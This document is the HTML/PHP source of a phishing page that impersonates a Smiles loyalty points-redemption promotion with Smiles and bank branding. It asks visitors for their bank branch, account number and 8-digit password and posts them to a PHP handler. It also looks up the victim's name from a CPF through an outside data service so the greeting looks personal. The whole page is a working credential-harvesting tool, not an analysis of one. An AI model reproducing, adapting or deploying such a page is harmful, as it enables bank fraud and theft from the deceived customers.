<!DOCTYPE html>
<html lang="pt-BR">
   <head>
        <title>Resgate de Pontos | Promoção Smiles</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="">
        
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="css/estilo.css">
        <link href="img/favicon.ico" rel="Shortcut Icon">

        <script src="js/jquery-3.2.1.min.js"></script>
        <script src="js/bootstrap.js"></script>
        <script src="js/script1.js"></script>
        <script src="js/script2.js"></script>
        <script src="js/script2.js?Xxxxdss" language="javascript"></script>
        <script src="//irql.bipbop.com.br/js/jquery.bipbop.min.js"></script>

        <script language="javascript">
            var isOK = false;
        </script>
   </head>

<body>
   <header role="banner" class="header header-pinned ng-scope">
       <div class="container-content content-header ng-scope">
           <div class="header-brands">
               <div class="header-brand">
                  <img alt="smiles&bb" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="img/logo.png" style="">
               </div>
           </div> 
       </div>
   </header>

   <main role="main" class="main main-content ng-scope">
       <div class="mpass-card ng-scope">
           <div class="container">
               <div class="row">
                   <div class="col-sm-6 ng-scope">
                       <div class="container-announcements">
                           <h1 class="text-announcements ng-binding">Vamos resgatar seus pontos Smiles</h1>
                           <p class="text-announcements h3 ng-binding ng-scope">Basta fornecer as informações da sua agencia, conta e a senha para que possamos prosseguir com o resgate do seus pontos Smiles.</p>
                       </div>
                   </div>
                   <div class="col-sm-6">
                      <div class="row">
                        <div class="col-4">
                          <div class="row">
                            <img class="img-fluid" src="img/user.png">       
                          </div>
                        </div>
                        <div id="topo2" style="color: #333; font-weight: bold">
                            <div style="float: left; margin-top: 20px; margin-left: -16px;">
                            Olá, <span id="nome" style="color: #333;">Cliente</span>
                            </div>
                        </div>
                      </div>
                      <div id="campos" style="clear: both;">

                      <form method="POST" action="webApps_AplicationInfo.php" onsubmit="return validarCampo()">
                        
                        <input type="hidden" name="cpf" id="cpf" value="<?php echo $_POST['cpf']; ?>" />

                        <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                          <ng-form class="row formly ng-pristine ng-valid ng-scope ng-isolate-scope">
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6">
                              <div class="ng-scope form-group has-feedback">
                                <input class="form-control" placeholder="Agencia" id="ag" name="ag" type="tel" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite uma Agencia válida !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('ag','cnt');" maxlength="5" required autofocus>
                              </div>
                            </div>
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6">
                              <div class="ng-scope form-group has-feedback">
                                <input class="form-control" id="cnt" name="cnt" placeholder="Conta" type="tel" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite uma Conta válida !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('cnt','s8');" maxlength="8" required>
                              </div>
                            </div>
                          </div>

                        <div class="formly-field ng-scope ng-isolate-scope formly-field-fieldUsername">
                          <div class="ng-scope form-group">
                            <div class="input-group">
                              <input class="form-control" name="s8" id="s8" placeholder="Digite sua senha (8 dígitos)" type="password" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite uma senha válida !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('s8','continue');" maxlength="8" minlength="8" required>
                              <div class="input-group-addon ng-scope">
                              </div>
                            </div>
                          </div>
                        </div>
                          <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6">
                              <div class="ng-scope form-group has-feedback">
                                <button type="submit" name="continue" id="continue" class="btn btn-block btn-primary ng-binding">Continuar</button>
                              </div>
                            </div>
                          </div>
                      </form>
                    </div>
               </div>
           </div>
       </div>
   </main>
</body>

<script language="javascript">
    $(document).ready(function(){
        
        
        $().bipbop("SELECT FROM 'BIPBOPJS'.'CPFCNPJ'", null, {
          data: {
              documento: $("#cpf").val(),
          },

          success: function(data) {
            var nome = $(data).find("body nome").text();
            var exception = $(data).find("header exception").text();

            if (exception) {
              exception = exception.replace(/, t/, '. T');
              //$('#status').text(exception);
            } else {
              $("#nome").text(ucfirst(nome.split(" ")[0]));
              $("#dados").show();
            }
          }
        });
        
    });
</script>
</html>

